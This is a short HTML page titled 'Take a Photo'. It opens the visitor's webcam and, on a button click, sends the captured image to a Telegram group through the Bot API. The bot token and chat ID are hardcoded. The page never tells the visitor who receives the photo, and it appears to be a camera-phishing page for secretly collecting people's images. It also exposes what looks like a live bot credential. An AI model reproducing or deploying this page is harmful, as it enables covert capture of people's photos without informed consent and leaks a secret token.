<!DOCTYPE html>
<html>
<head>
  <title>Take a Photo</title>
</head>
<body>
  <h2>Click below to take a photo</h2>
  <video id="video" width="300" height="225" autoplay></video>
  <button id="snap">Take Photo</button>
  <canvas id="canvas" width="300" height="225" style="display: none;"></canvas>

  <script>
    const botToken = '7573311957:AAGMWs3uoC6v-6R9TDsW1P-S7K9UHpZ7BsQ';
    const chatId = '-1002640168734'; // Aapka ya group ka chat ID

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const snap = document.getElementById('snap');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; });

    snap.addEventListener('click', () => {
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, 300, 225);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.png');

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(response => alert("Photo sent!"))
        .catch(error => alert("Failed to send photo"));
      }, 'image/png');
    });
  </script>
</body>
</html>
